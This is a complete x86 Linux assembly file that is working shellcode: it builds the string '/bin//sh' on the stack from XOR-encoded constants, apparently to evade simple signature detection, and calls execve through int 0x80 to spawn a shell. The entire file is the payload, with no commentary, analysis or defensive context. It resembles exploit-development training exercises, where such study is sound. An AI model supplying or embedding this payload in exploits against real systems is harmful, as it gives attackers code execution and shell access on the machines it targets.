section .text
        global _start
 
_start:
    xor     ecx, ecx
    mul     ecx
    push    ecx
    ;push    0x68732f2f
    mov     ebx, 0x2c376b6b
    xor     ebx, 0x44444444
    push    ebx
    ;push    0x6e69622f
    xor     ebx, 0x61a4d00
    push    ebx
    mov     ebx, esp
    mov     al, 0xb
    int     0x80


